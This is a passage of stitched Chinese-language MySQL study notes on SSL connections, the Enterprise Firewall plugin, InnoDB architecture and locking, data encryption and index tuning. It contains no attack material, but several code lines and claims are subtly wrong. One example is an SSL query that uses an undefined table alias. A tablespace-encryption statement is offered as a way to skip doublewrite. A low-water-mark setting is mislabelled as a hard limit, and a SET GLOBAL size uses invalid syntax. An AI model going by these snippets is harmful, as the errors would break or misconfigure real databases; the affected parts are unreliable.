SHOW VARIABLES LIKE '%ssl%';
-- have_ssl = YES
```

### 2.2 手动配置

```ini
[mysqld]
ssl-ca = /etc/mysql/ssl/ca.pem
ssl-cert = /etc/mysql/ssl/server-cert.pem
ssl-key = /etc/mysql/ssl/server-key.pem
require_secure_transport = ON  -- 强制加密连接
```

## 3. 强制加密连接

```sql
-- 创建必须使用SSL的用户
CREATE USER 'secure_user'@'%' IDENTIFIED BY 'password'
REQUIRE SSL;

-- 创建需要客户端证书的用户
CREATE USER 'cert_user'@'%' IDENTIFIED BY 'password'
REQUIRE X509;

-- 修改现有用户
ALTER USER 'app_user'@'%' REQUIRE SSL;
```

## 4. 客户端连接

```bash
# 使用SSL连接
mysql -u secure_user -p --ssl-mode=REQUIRED

# 使用客户端证书
mysql -u cert_user -p \
    --ssl-ca=/etc/mysql/ssl/ca.pem \
    --ssl-cert=/etc/mysql/ssl/client-cert.pem \
    --ssl-key=/etc/mysql/ssl/client-key.pem

# 验证SSL连接
mysql> \s
-- SSL: Cipher in use is TLS_AES_256_GCM_SHA384
```

## 5. 验证SSL连接

```sql
-- 查看当前连接是否加密
SELECT * FROM performance_schema.session_status
WHERE VARIABLE_NAME = 'Ssl_cipher';

-- 查看所有连接的SSL状态
SELECT sbt.thread_id, sbt.ssl_cipher, sbt.user, sbt.host
FROM performance_schema.threads t
JOIN performance_schema.session_connect_attrs sca
    ON t.processlist_id = sca.processlist_id
WHERE sca.attr_name = 'ssl_cipher';
```

<!-- ============ 文档分隔线：020-mysql/052-FirewallPlugin.md ============ -->

## 1. MySQL 企业防火墙

MySQL Enterprise Firewall 记录正常SQL模式，拦截异常SQL，防止SQL注入。

## 2. 安装与配置

```sql
-- 安装防火墙插件
INSTALL PLUGIN mysql_firewall SONAME 'mysql_firewall.so';
INSTALL PLUGIN mysql_firewall_users SONAME 'mysql_firewall.so';
INSTALL PLUGIN mysql_firewall_whitelist SONAME 'mysql_firewall.so';

-- 创建防火墙用户
CREATE USER 'fw_user'@'%';
CALL mysql.sp_set_firewall_mode('fw_user@%', 'RECORDING');
```

## 3. 三种模式

| 模式       | 说明                       |
| ---------- | -------------------------- |
| RECORDING  | 记录SQL模式，建立白名单    |
| PROTECTING | 允许白名单SQL，拦截异常SQL |
| DETECTING  | 允许所有SQL，记录异常SQL   |

```sql
-- 学习模式：记录正常SQL
CALL mysql.sp_set_firewall_mode('fw_user@%', 'RECORDING');
-- 执行正常业务SQL...

-- 切换到保护模式
CALL mysql.sp_set_firewall_mode('fw_user@%', 'PROTECTING');

-- 检测模式（不拦截，只记录）
CALL mysql.sp_set_firewall_mode('fw_user@%', 'DETECTING');
```

## 4. 查看防火墙状态

```sql
-- 查看用户防火墙模式
SELECT * FROM mysql.firewall_users;

-- 查看白名单规则
SELECT * FROM mysql.firewall_whitelist;

-- 查看拦截统计
SELECT * FROM performance_schema.firewall_status;
```

<!-- ============ 文档分隔线：020-mysql/053-InnoDBSystemArchitecture.md ============ -->

## 1. InnoDB 存储引擎概述

InnoDB 是 MySQL 默认的事务型存储引擎，以其高可靠性、高并发性和对 ACID 事务的完整支持而闻名。理解 InnoDB 的体系架构是进行高级性能调优和故障排查的基础。

### 1.1 InnoDB 核心特性

- **事务支持**：完整的 ACID 兼容，支持 commit、rollback 和崩溃恢复
- **行级锁**：细粒度锁机制，支持高并发读写
- **外键约束**：唯一支持外键的存储引擎
- **MVCC**：多版本并发控制，读不阻塞写，写不阻塞读
- **自动崩溃恢复**：通过 redo log 和 undo log 实现故障后的自动恢复

### 1.2 InnoDB 体系架构总览

```mermaid
flowchart TD
    Conn[客户端连接层] --> Server[MySQL Server 层<br/>解析器 → 优化器 → 执行器]
    Server --> Inno[InnoDB 存储引擎层]
    Inno --> BP[Buffer Pool]
    Inno --> CB[Change Buffer]
    Inno --> AH[Adaptive Hash]
    Inno --> LB[Log Buffer]
    Inno --> DW[Doublewrite]
    Inno --> UT[Undo Tables]
    Inno --> FS[文件系统层<br/>.ibd / ibdata1 / ib_logfile0,1]
```

## 2. 聚簇索引与二级索引

### 2.1 聚簇索引 (Clustered Index)

聚簇索引将数据行与主键索引存储在同一棵 B+ 树中，叶子节点直接包含完整的行数据。每张表只能有一个聚簇索引。

```sql
-- 创建表时指定主键，InnoDB 自动创建聚簇索引
CREATE TABLE orders (
    order_id BIGINT NOT NULL AUTO_INCREMENT,
    customer_id INT NOT NULL,
    order_date DATETIME NOT NULL,
    total_amount DECIMAL(12, 2),
    status VARCHAR(20),
    PRIMARY KEY (order_id)   -- 聚簇索引
) ENGINE=InnoDB;

-- 若无显式主键，InnoDB 选择第一个非空唯一索引作为聚簇索引
-- 若也没有唯一索引，InnoDB 自动生成 6 字节的 ROW_ID
```

**聚簇索引的特点**：

- 主键查询极快，只需一次 B+ 树查找即可获取完整行数据
- 范围查询高效，叶子节点通过双向链表连接
- 插入顺序依赖主键，乱序插入会导致页分裂

### 2.2 二级索引 (Secondary Index)

二级索引的叶子节点存储主键值而非行数据，查询非索引列需要回表操作。

```sql
-- 创建二级索引
CREATE INDEX idx_customer ON orders(customer_id);

-- 覆盖索引：避免回表
CREATE INDEX idx_customer_date ON orders(customer_id, order_date);

-- 查询优化：覆盖索引避免回表
SELECT customer_id, order_date
FROM orders
WHERE customer_id = 1001;
-- Extra: Using index → 命中覆盖索引，无需回表
```

### 2.3 回表与覆盖索引

```sql
-- 回表过程演示
SELECT * FROM orders WHERE customer_id = 1001;
-- 1. 在 idx_customer 二级索引中查找 customer_id=1001 → 得到 order_id
-- 2. 在聚簇索引中查找 order_id → 得到完整行数据（回表）

-- 覆盖索引避免回表
SELECT customer_id, order_date
FROM orders
WHERE customer_id = 1001;
-- 仅需访问 idx_customer_date 索引，无需回表
```

## 3. 自适应哈希索引 (Adaptive Hash Index)

### 3.1 工作原理

自适应哈希索引（AHI）是 InnoDB 的自动优化机制，它监控对 B+ 树索引页的频繁访问模式，为热点页自动构建哈希索引。

```sql
-- 查看自适应哈希索引状态
SHOW ENGINE InnoDB STATUS\G
-- 查找 "INSERT BUFFER AND ADAPTIVE HASH INDEX" 段

-- 启用/禁用自适应哈希索引
SET GLOBAL innodb_adaptive_hash_index = ON;   -- 默认开启
SET GLOBAL innodb_adaptive_hash_index = OFF;

-- 查看 AHI 使用统计
SELECT * FROM performance_schema.setup_instruments
WHERE NAME LIKE '%adaptive_hash%';
```

### 3.2 AHI 适用场景

- **等值查询**：`WHERE col = value`，哈希查找 O(1)
- **热点数据**：频繁访问的索引页
- **高并发读**：减少 B+ 树遍历层级

### 3.3 AHI 局限性

- 不支持范围查询和排序
- 高并发写入时 AHI 的锁争用可能成为瓶颈
- 内存占用增加

```sql
-- 高并发写入场景建议关闭 AHI
SET GLOBAL innodb_adaptive_hash_index = OFF;

-- 监控 AHI 争用
SELECT event_name, count_star
FROM performance_schema.events_waits_summary_global_by_event_name
WHERE event_name LIKE '%adaptive_hash%';
```

## 4. 变更缓冲 (Change Buffer)

### 4.1 工作机制

变更缓冲用于缓存对二级索引页的修改操作（INSERT、DELETE、UPDATE），当对应页不在 Buffer Pool 中时，将变更暂存于变更缓冲中，待页被读取时再合并（merge）。

```sql
-- 查看变更缓冲状态
SHOW ENGINE InnoDB STATUS\G
-- 查找 "INSERT BUFFER AND ADAPTIVE HASH INDEX" 段

-- 配置变更缓冲策略
-- ibuf_size = innodb_change_buffer_max_size * innodb_buffer_pool_size
SET GLOBAL innodb_change_buffer_max_size = 25;  -- 默认25%，最大50%

-- 控制变更缓冲的操作类型
-- all: 缓冲所有操作（默认）
-- inserts: 仅缓冲插入
-- deletes: 仅缓冲删除
-- changes: 缓冲插入和删除
-- none: 禁用变更缓冲
SET GLOBAL innodb_change_buffering = 'all';
```

### 4.2 变更缓冲适用场景

- **写多读少**：大量 INSERT/UPDATE，二级索引页不常被读取
- **非唯一索引**：唯一索引需要立即验证唯一性，无法缓冲

```sql
-- 唯一索引的修改无法使用变更缓冲
CREATE UNIQUE INDEX uk_email ON users(email);  -- 每次插入都需立即检查唯一性

-- 非唯一索引可以使用变更缓冲
CREATE INDEX idx_created ON orders(created_at);  -- 插入时可缓冲
```

## 5. 双写缓冲 (Doublewrite Buffer)

### 5.1 解决的问题

InnoDB 页大小为 16KB，而操作系统磁盘 I/O 通常以 4KB 为单位。如果在写入页的过程中发生崩溃，可能出现"部分写入"（torn page），导致数据页损坏。双写缓冲通过先写入备份副本再写入实际位置来解决这个问题。

```sql
-- 查看双写缓冲状态
SHOW GLOBAL STATUS LIKE 'Innodb_dblwr%';
-- Innodb_dblwr_pages_written: 已写入双写缓冲的页数
-- Innodb_dblwr_writes: 双写缓冲写入次数

-- 启用/禁用双写缓冲（生产环境务必保持启用）
SET GLOBAL innodb_doublewrite = ON;  -- 默认开启
```

### 5.2 双写流程

```
1. 脏页需要刷新到磁盘
2. 先将脏页写入双写缓冲区（共享表空间中的连续 2MB 区域）
3. 双写缓冲写入完成后，再将脏页写入实际的数据文件位置
4. 如果步骤3崩溃，恢复时从双写缓冲中找到完整副本进行修复
```

### 5.3 跳过双写的场景

```sql
-- 使用 innodb_flush_method=O_DIRECT 时，操作系统缓存不会造成部分写入
-- 但双写缓冲仍提供额外保护

-- 对于已启用 innodb_file_per_table 且使用 O_DIRECT 的表空间
-- MySQL 8.0+ 可为单个表空间禁用双写
ALTER TABLESPACE innodb_system SET SKIP_ENCRYPTION = 0;
```

## 6. 预读机制 (Read-Ahead)

### 6.1 线性预读 (Linear Read-Ahead)

当顺序访问一个 extent（1MB，64个页）中的某个阈值数量的页时，InnoDB 预读整个 extent。

```sql
-- 线性预读阈值：extent 中被顺序访问的页数达到该值触发预读
SET GLOBAL innodb_read_ahead_threshold = 56;  -- 默认56，范围1-64

-- 监控预读效果
SHOW GLOBAL STATUS LIKE 'Innodb_buffer_pool_read_ahead%';
-- Innodb_buffer_pool_read_ahead: 预读装入的页数
-- Innodb_buffer_pool_read_ahead_evicted: 预读但未被访问就被淘汰的页数
```

### 6.2 随机预读 (Random Read-Ahead)

当一个 extent 中已有大量页在 Buffer Pool 中时，预读该 extent 的剩余页。

```sql
-- 随机预读默认禁用
SET GLOBAL innodb_random_read_ahead = OFF;  -- 默认OFF

-- 随机预读在大多数场景下效果不佳，建议保持关闭
```

## 7. 事务日志系统

### 7.1 Redo Log (重做日志)

Redo Log 记录的是物理级别的页修改操作，用于崩溃恢复时重做已提交事务的修改。

```sql
-- 查看 redo log 配置
SHOW VARIABLES LIKE 'innodb_log%';
-- innodb_log_file_size: 单个日志文件大小
-- innodb_log_files_in_group: 日志文件数量
-- innodb_log_buffer_size: 日志缓冲区大小

-- MySQL 8.0+ 动态调整 redo log 大小
ALTER INSTANCE SET GLOBAL innodb_redo_log_capacity = 4294967296;  -- 4GB

-- 查看 redo log 当前状态
SHOW VARIABLES LIKE 'innodb_redo_log_capacity';
```

**Redo Log 刷盘策略**：

```sql
-- 控制 redo log 的持久化策略
-- 0: 每秒刷盘（可能丢失1秒数据）
-- 1: 每次事务提交刷盘（最安全，默认）
-- 2: 每次提交写入OS缓存，每秒fsync
SET GLOBAL innodb_flush_log_at_trx_commit = 1;  -- 生产环境推荐1
```

### 7.2 Undo Log (回滚日志)

Undo Log 记录数据修改前的旧值，用于事务回滚和 MVCC 读视图。

```sql
-- 查看 undo 表空间配置
SHOW VARIABLES LIKE 'innodb_undo%';
-- innodb_undo_tablespaces: undo表空间数量
-- innodb_max_undo_log_size: undo表空间最大大小

-- MySQL 8.0+ 支持在线截断 undo 表空间
SET GLOBAL innodb_undo_log_truncate = ON;  -- 默认开启
SET GLOBAL innodb_max_undo_log_size = 1073741824;  -- 1GB

-- 监控 undo 表空间
SELECT * FROM information_schema.INNODB_TABLESPACES
WHERE SPACE_TYPE = 'Undo';
```

### 7.3 日志系统协作流程

```
事务提交流程：
1. 修改数据页 → 写入 Buffer Pool（脏页）
2. 记录修改前旧值 → 写入 Undo Log
3. 记录修改操作 → 写入 Redo Log Buffer
4. Redo Log Buffer 刷盘（根据 innodb_flush_log_at_trx_commit）
5. 事务提交成功
6. 后台线程异步将脏页刷回磁盘（checkpoint）
```

## 8. MVCC 实现机制

### 8.1 隐藏列

InnoDB 为每行数据自动添加三个隐藏列：

| 隐藏列      | 大小  | 说明                               |
| :---------- | :---- | :--------------------------------- |
| DB_TRX_ID   | 6字节 | 最后修改该行的事务ID               |
| DB_ROLL_PTR | 7字节 | 回滚指针，指向 undo log 中的前版本 |
| DB_ROW_ID   | 6字节 | 隐藏自增ID（无主键时使用）         |

### 8.2 Read View (读视图)

Read View 是事务在进行快照读时创建的一致性视图，决定当前事务能看到哪些版本的数据。

```sql
-- RC 隔离级别：每次 SELECT 创建新的 Read View
-- RR 隔离级别：事务中第一次 SELECT 创建 Read View，后续复用

-- 查看 MVCC 相关信息
SELECT trx_id, trx_state, trx_started, trx_query
FROM information_schema.INNODB_TRX;
```

**Read View 的核心判断逻辑**：

```
对于某行数据的某个版本：
1. trx_id < min_trx_id → 该版本在 Read View 创建前已提交 → 可见
2. trx_id >= max_trx_id → 该版本在 Read View 创建后才产生 → 不可见
3. min_trx_id <= trx_id < max_trx_id:
   - trx_id 在 creator_trx_id 列表中 → 该版本由未提交事务创建 → 不可见
   - trx_id 不在 creator_trx_id 列表中 → 该版本已提交 → 可见
4. 不可见时，沿 DB_ROLL_PTR 遍历 undo log 版本链，找到可见版本
```

### 8.3 回滚段 (Rollback Segment)

```sql
-- 查看回滚段信息
SELECT * FROM information_schema.INNODB_SEGMENTS
WHERE SPACE_TYPE = 'Undo' LIMIT 10;

-- 回滚段结构
-- 每个回滚段包含 1024 个 undo log slot
-- MySQL 8.0 默认 128 个回滚段
SET GLOBAL innodb_rollback_segments = 128;  -- 默认128
```

### 8.4 MVCC 版本链示例

```sql
-- 事务A: 插入数据
INSERT INTO accounts (id, balance) VALUES (1, 1000);
-- DB_TRX_ID = 100, DB_ROLL_PTR = NULL

-- 事务B: 修改余额
UPDATE accounts SET balance = 800 WHERE id = 1;
-- 新版本: DB_TRX_ID = 200, DB_ROLL_PTR → 旧版本(balance=1000, trx_id=100)

-- 事务C: 再次修改
UPDATE accounts SET balance = 600 WHERE id = 1;
-- 新版本: DB_TRX_ID = 300, DB_ROLL_PTR → 版本2(balance=800, trx_id=200)
-- 版本2: DB_ROLL_PTR → 版本1(balance=1000, trx_id=100)

-- 版本链: [600/300] → [800/200] → [1000/100]
-- Read View 根据自身事务ID决定可见版本
```

## 9. Buffer Pool 结构

### 9.1 LRU 列表

InnoDB 的 Buffer Pool 使用改进的 LRU 算法，将 LRU 列表分为 young 区和 old 区，防止全表扫描等操作将热点数据挤出缓存。

```sql
-- 配置 Buffer Pool
SET GLOBAL innodb_buffer_pool_size = 8589934592;  -- 8GB
SET GLOBAL innodb_buffer_pool_instances = 8;       -- 多实例减少锁争用

-- old 区占比
SET GLOBAL innodb_old_blocks_pct = 37;  -- 默认37%，即 old 区占 LRU 的 3/8

-- 页在 old 区停留时间超过此值才可能移入 young 区
SET GLOBAL innodb_old_blocks_time = 1000;  -- 默认1000ms
```

### 9.2 脏页刷新机制

```sql
-- 查看脏页刷新相关参数
SHOW VARIABLES LIKE 'innodb_io_capacity%';
-- innodb_io_capacity: 每秒刷新页数（SSD建议10000+）
-- innodb_io_capacity_max: 最大刷新速率

SET GLOBAL innodb_io_capacity = 10000;
SET GLOBAL innodb_io_capacity_max = 20000;

-- 自适应刷新：根据 redo log 生成速率和脏页比例动态调整刷新速度
SET GLOBAL innodb_adaptive_flushing = ON;  -- 默认开启
SET GLOBAL innodb_adaptive_flushing_lwm = 10;  -- redo log 容量使用10%时开始刷新

-- 脏页比例阈值：超过此值时加速刷新
SET GLOBAL innodb_max_dirty_pages_pct = 90;       -- 软限
SET GLOBAL innodb_max_dirty_pages_pct_lwm = 10;   -- 硬限（开始刷新的阈值）
```

### 9.3 Buffer Pool 监控

```sql
-- 查看 Buffer Pool 状态
SHOW ENGINE InnoDB STATUS\G
-- 查找 "BUFFER POOL AND MEMORY" 段

-- 详细统计
SELECT * FROM sys.innodb_buffer_stats_by_table
ORDER BY pages DESC LIMIT 10;

-- 查看 Buffer Pool 命中率
SHOW GLOBAL STATUS LIKE 'Innodb_buffer_pool_read%';
-- 命中率 = 1 - Innodb_buffer_pool_reads / Innodb_buffer_pool_read_requests
-- 目标: > 99%
```

## 10. InnoDB 锁机制详解

### 10.1 行锁 (Record Lock)

行锁锁定索引记录，是最基本的锁类型。

```sql
-- 行锁示例
BEGIN;
SELECT * FROM orders WHERE order_id = 100 FOR UPDATE;
-- 在 order_id=100 的索引记录上加 X 锁

-- 查看当前锁信息
SELECT * FROM performance_schema.data_locks;
SELECT * FROM performance_schema.data_lock_waits;
```

### 10.2 间隙锁 (Gap Lock)

间隙锁锁定索引记录之间的间隙，防止其他事务在间隙中插入新记录，用于解决幻读问题。

```sql
-- 间隙锁示例（RR 隔离级别）
BEGIN;
SELECT * FROM orders WHERE order_id BETWEEN 100 AND 200 FOR UPDATE;
-- 锁定 (100, 200) 之间的间隙，阻止其他事务插入 order_id 在此范围的记录

-- 间隙锁之间不互斥，与插入意向锁互斥
-- 间隙锁仅在 RR 隔离级别生效，RC 下不使用间隙锁
```

### 10.3 临键锁 (Next-Key Lock)

临键锁 = 行锁 + 间隙锁，锁定一条索引记录及其前面的间隙，是 InnoDB 在 RR 级别下默认的行锁算法。

```sql
-- 临键锁示例
BEGIN;
SELECT * FROM orders WHERE order_id >= 100 FOR UPDATE;
-- 假设索引中存在 order_id: 50, 100, 150, 200
-- 临键锁锁定: (50, 100], (100, 150], (150, 200], (200, +∞)

-- 退化规则：
-- 1. 等值查询命中唯一索引 → 退化为行锁
-- 2. 等值查询未命中 → 退化为间隙锁
-- 3. 范围查询 → 临键锁
```

### 10.4 意向锁 (Intention Lock)

意向锁是表级锁，表示事务即将对表中的行加行锁，用于快速判断表中是否存在行级锁冲突。

```sql
-- 意向锁自动添加，无需手动操作
-- 意向共享锁 (IS): 事务打算加行级 S 锁
-- 意向排他锁 (IX): 事务打算加行级 X 锁

-- 意向锁之间兼容，与表级锁冲突
-- IS/IX 之间兼容，IS/IX 与行锁兼容
-- IS 与表级 X 锁冲突，IX 与表级 S/X 锁冲突

-- 查看意向锁
SELECT OBJECT_NAME, LOCK_TYPE, LOCK_MODE
FROM performance_schema.data_locks
WHERE LOCK_MODE LIKE 'INTENTION%';
```

### 10.5 插入意向锁 (Insert Intention Lock)

插入意向锁是特殊的间隙锁，在 INSERT 操作时设置，表示插入意向。多个事务向同一间隙的不同位置插入时不会互相阻塞。

```sql
-- 插入意向锁示例
-- 事务A: INSERT INTO orders (order_id) VALUES (120);  -- 在间隙(100,150)中插入
-- 事务B: INSERT INTO orders (order_id) VALUES (130);  -- 在间隙(100,150)中插入
-- 两个事务不冲突，因为插入的是不同位置

-- 但如果间隙已被间隙锁锁定，插入意向锁会被阻塞
-- 事务C: SELECT * FROM orders WHERE order_id > 100 FOR UPDATE;
-- 事务D: INSERT INTO orders (order_id) VALUES (120);  -- 被阻塞，等待插入意向锁
```

### 10.6 锁兼容性矩阵

|        | IS   | IX   | S    | X    | AI(自增锁) |
| :----- | :--- | :--- | :--- | :--- | :--------- |
| **IS** | 兼容 | 兼容 | 兼容 | 冲突 | 兼容       |
| **IX** | 兼容 | 兼容 | 冲突 | 冲突 | 兼容       |
| **S**  | 兼容 | 冲突 | 兼容 | 冲突 | 冲突       |
| **X**  | 冲突 | 冲突 | 冲突 | 冲突 | 冲突       |
| **AI** | 兼容 | 兼容 | 冲突 | 冲突 | 冲突       |

## 11. 实战：InnoDB 架构参数调优

### 11.1 内存相关参数

```sql
-- Buffer Pool 大小：通常设为物理内存的 60%-80%
SET GLOBAL innodb_buffer_pool_size = 12G;

-- 实例数：每个实例管理一部分 Buffer Pool，减少锁争用
-- 建议：Buffer Pool >= 1GB 时，每个实例管理 1GB
SET GLOBAL innodb_buffer_pool_instances = 12;

-- 日志缓冲区大小
SET GLOBAL innodb_log_buffer_size = 64M;
```

### 11.2 刷新与持久化参数

```sql
-- 数据和日志的刷盘方式
SET GLOBAL innodb_flush_method = 'O_DIRECT';  -- Linux 推荐

-- 脏页刷新参数
SET GLOBAL innodb_io_capacity = 10000;         -- SSD 环境
SET GLOBAL innodb_io_capacity_max = 20000;
SET GLOBAL innodb_flush_neighbors = 0;          -- SSD 关闭邻居页刷新

-- 关闭查询时预取
SET GLOBAL innodb_flush_sync = OFF;             -- 避免 checkpoint 刷新影响查询
```

### 11.3 监控 InnoDB 运行状态

```sql
-- 综合状态查看
SHOW ENGINE InnoDB STATUS\G

-- 关键性能指标
SELECT
    (1 - (Variable_value / (
        SELECT Variable_value
        FROM performance_schema.global_status
        WHERE Variable_name = 'Innodb_buffer_pool_read_requests'
    ))) * 100 AS buffer_pool_hit_rate
FROM performance_schema.global_status
WHERE Variable_name = 'Innodb_buffer_pool_reads';

-- 锁等待统计
SELECT * FROM sys.innodb_lock_waits;

-- 事务状态
SELECT trx_id, trx_state, trx_started,
       trx_rows_locked, trx_lock_structs,
       trx_query
FROM information_schema.INNODB_TRX
ORDER BY trx_started;
```

<!-- ============ 文档分隔线：020-mysql/054-DataEncryption.md ============ -->

## 1. 透明数据加密（TDE）

### 1.1 概述

InnoDB 透明数据加密（Transparent Data Encryption）在存储层自动加密数据，对应用透明。

### 1.2 配置

```ini
[mysqld]
early-plugin-load = keyring_file.so
keyring_file_data = /var/lib/mysql-keyring/keyring
```

```sql
-- 安装 keyring 插件
INSTALL PLUGIN keyring_file SONAME 'keyring_file.so';

-- 查看插件状态
SELECT PLUGIN_NAME, PLUGIN_STATUS FROM information_schema.PLUGINS
WHERE PLUGIN_NAME LIKE 'keyring%';
```

## 2. 加密表空间

```sql
-- 创建加密表
CREATE TABLE sensitive_data (
    id BIGINT PRIMARY KEY,
    ssn VARCHAR(20),
    credit_card VARCHAR(20)
) ENCRYPTION = 'Y';

-- 加密现有表
ALTER TABLE sensitive_data ENCRYPTION = 'Y';

-- 加密通用表空间
CREATE TABLESPACE encrypted_ts ADD DATAFILE 'encrypted_ts.ibd' ENCRYPTION = 'Y';
```

## 3. 加密 redo log 和 undo log

```sql
-- 加密 redo log
SET GLOBAL innodb_redo_log_encrypt = ON;

-- 加密 undo log
SET GLOBAL innodb_undo_log_encrypt = ON;
```

## 4. 密钥轮换

```sql
-- 轮换主密钥
ALTER INSTANCE ROTATE INNODB MASTER KEY;

-- 建议定期轮换（如每季度）
```

## 5. 密钥管理

```sql
-- keyring_file：文件存储（开发环境）
-- keyring_encrypted_file：加密文件存储
-- keyring_okv：Oracle Key Vault
-- keyring_aws：AWS KMS

-- 生产环境推荐使用外部密钥管理服务
```

<!-- ============ 文档分隔线：020-mysql/055-MySQLIndexExecutionPlan.md ============ -->

## 1. 索引是什么 (What is an Index)

索引是为了加速检索而构建的数据结构。对 InnoDB 来说，常见索引是 B+Tree。
索引带来的收益：

- 加速 `WHERE` 过滤、`JOIN`、`ORDER BY`、`GROUP BY`
  索引带来的成本：
- 写入变慢（INSERT/UPDATE/DELETE 需要维护索引）
- 占用更多空间
- 设计不当会让查询优化器选错计划或无法利用索引

## 2. InnoDB 索引要点 (InnoDB Basics)

### 2.1 聚簇索引与二级索引

- 主键索引（聚簇索引）：叶子节点存放整行数据
- 二级索引：叶子节点存放“索引列 + 主键值”
  因此：
- 用二级索引命中后，可能需要回表（根据主键再查一次聚簇索引）
- 覆盖索引可以避免回表（查询列都在索引里）

## 3. 组合索引与最左前缀 (Composite Index)

假设有索引 `(a, b, c)`：

- 能有效利用：`a`、`a,b`、`a,b,c` 的前缀过滤
- 不能跳过前缀：只用 `b` 或 `c` 往往无法走该索引
  实践建议：
- 把区分度更高、过滤更强的列放在前面（但也要结合排序/分组需求）
- 频繁按 `(tenant_id, created_at)` 查询，优先建立组合索引

## 4. 什么时候索引会失效 (When Index Isn’t Used)

常见原因：

- 对索引列做函数/表达式：`WHERE DATE(created_at) = ...`
- 隐式类型转换：字符串与数字混用导致无法利用索引
- 前缀缺失：组合索引没用到最左前缀
- `LIKE '%xxx'` 前置通配符无法利用普通 B+Tree 索引
- 返回行数过多：优化器认为全表扫描更便宜

## 5. EXPLAIN 怎么看 (How to Read EXPLAIN)

常用字段（MySQL 8）：

- `type`：访问类型（从好到差大致：`const`/`ref`/`range`/`index`/`ALL`）
- `key`：实际使用的索引
- `rows`：估算扫描行数
- `Extra`：额外信息（例如 `Using index`、`Using filesort`、`Using temporary`）
  示例：

```sql
 EXPLAIN
 SELECT id, email
 from user_account
 WHERE email = 'a@b.com';
```

解读目标：

- 是否使用了期望的索引（`key`）
- 扫描行数是否可控（`rows`）
- 是否出现 `Using filesort` / `Using temporary`（可能需要优化索引或 SQL）

## 6. 建索引的实用策略 (Practical Strategy)

- 先写出典型查询，再反推索引，而不是“先建一堆索引”
- 一张表的索引数量控制在合理范围，避免写放大
- 组合索引优先覆盖高频查询路径
- 长字符串字段用前缀索引需谨慎（会影响选择性与排序能力）
- 对时间范围查询：`(tenant_id, created_at)` 常见有效

## 7. 小结 (Summary)

- 索引是“以写换读”的典型优化手段
- 组合索引与最左前缀是 MySQL 索引设计的核心
- EXPLAIN 是验证索引是否生效的第一工具

---

## 索引创建

**单行写法：创建单列普通索引**
`CREATE INDEX <索引名> ON <表名>(<列名>)`
```sql
-- 为用户名列创建普通索引
CREATE INDEX idx_username ON users(username);
```

**单行写法：创建复合索引**
`CREATE INDEX <索引名> ON <表名>(<列名1>, <列名2>[, ...])`
```sql
-- 为用户名和状态列创建复合索引
CREATE INDEX idx_name_status ON users(username, status);
```

**单行写法：创建单列唯一索引**
`CREATE UNIQUE INDEX <索引名> ON <表名>(<列名>)`
```sql
-- 为邮箱列创建唯一索引
CREATE UNIQUE INDEX idx_email ON users(email);
```

**单行写法：创建复合唯一索引**
`CREATE UNIQUE INDEX <索引名> ON <表名>(<列名1>, <列名2>[, ...])`
```sql
-- 为订单 ID 和产品 ID 创建复合唯一索引
CREATE UNIQUE INDEX idx_order_product ON order_items(order_id, product_id);
```

**单行写法：创建前缀索引**
`CREATE INDEX <索引名> ON <表名>(<列名>(<长度>))`
```sql
-- 为长字符串邮箱列创建前缀索引
CREATE INDEX idx_email_prefix ON users(email(10));
```

**单行写法：创建全文索引**
`ALTER TABLE <表名> ADD FULLTEXT INDEX <索引名> (<列名>[, <列名>...])`
```sql
-- 为文章标题和内容创建全文索引
ALTER TABLE articles ADD FULLTEXT INDEX ft_title_content (title, content);
```

**单行写法：通过 ALTER TABLE 添加普通索引**
`ALTER TABLE <表名> ADD INDEX <索引名> (<列名>[, <列名>...])`
```sql
-- 通过 ALTER TABLE 添加普通索引
ALTER TABLE users ADD INDEX idx_age (age);
```

**单行写法：通过 ALTER TABLE 添加唯一索引**
`ALTER TABLE <表名> ADD UNIQUE INDEX <索引名> (<列名>[, <列名>...])`
```sql
-- 通过 ALTER TABLE 添加唯一索引
ALTER TABLE users ADD UNIQUE INDEX idx_phone (phone);
```

**单行写法：通过 ALTER TABLE 添加复合索引**
`ALTER TABLE <表名> ADD INDEX <索引名> (<列名1>, <列名2>[, ...])`
```sql
-- 通过 ALTER TABLE 添加复合索引
ALTER TABLE users ADD INDEX idx_age_gender (age, gender);
```

---

## 索引查看与删除

**单行写法：查看表索引**
`SHOW INDEX FROM <表名>`
```sql
-- 查看表的索引信息
SHOW INDEX FROM users;
```

**单行写法：竖向显示索引**
`SHOW INDEX FROM <表名>\G`
```sql
-- 竖向显示表索引信息
SHOW INDEX FROM users\G
```

**单行写法：删除索引**
`DROP INDEX <索引名> ON <表名>`
```sql
-- 删除指定索引
DROP INDEX idx_username ON users;
```

**单行写法：删除主键索引**
`ALTER TABLE <表名> DROP PRIMARY KEY`
```sql
-- 删除主键索引
ALTER TABLE users DROP PRIMARY KEY;
```

---

## 复合索引与最左前缀

**单行写法：创建复合索引**
`CREATE INDEX <索引名> ON <表名>(<列1>, <列2>, <列3>)`
```sql
-- 为状态和创建时间创建复合索引
CREATE INDEX idx_status_created ON users(status, created_at);
```

**单行写法：使用前缀列查询（能利用索引）**
`SELECT * FROM <表名> WHERE <前缀列> <操作符> <值>`
```sql
-- 使用复合索引的第一列查询能利用索引
SELECT * FROM users WHERE status = 1;
```

**单行写法：使用前缀列组合查询（能利用索引）**
`SELECT * FROM <表名> WHERE <前缀列1> <操作符> <值> AND <前缀列2> <操作符> <值>`
```sql
-- 使用复合索引的前两列查询能利用索引
SELECT * FROM users WHERE status = 1 AND created_at > '2024-01-01';
```

**单行写法：跳过前缀列查询（不能利用索引）**
`SELECT * FROM <表名> WHERE <非前缀列> <操作符> <值>`
```sql
-- 跳过第一列查询不能利用索引
SELECT * FROM users WHERE created_at > '2024-01-01';
```

---

## EXPLAIN 执行计划

**换行写法：查看 SELECT 执行计划**
`EXPLAIN <SELECT 语句>`
```sql
-- 查看查询的执行计划
EXPLAIN
SELECT id, email
FROM user_account
WHERE email = 'a@b.com';
```

**单行写法：查看 UPDATE 执行计划**
`EXPLAIN <UPDATE 语句>`
```sql
-- 查看更新语句的执行计划
EXPLAIN UPDATE users SET status = 0 WHERE last_login_time < '2023-01-01';
```

---

## 覆盖索引

**单行写法：使用覆盖索引避免回表**
`SELECT <索引列> FROM <表名> WHERE <索引列> <操作符> <值>`
```sql
-- 查询列都在索引中避免回表
SELECT id, email FROM users WHERE email = 'test@example.com';
```

---

## 索引失效场景

**单行写法：函数导致索引失效**
`WHERE <函数>(<列名>) <操作符> <值>`
```sql
-- 对索引列使用函数导致索引失效
SELECT * FROM users WHERE DATE(created_at) = '2024-01-01';
```

**单行写法：改写为范围查询利用索引**
`WHERE <列名> >= '<起始>' AND <列名> < '<结束>'`
```sql
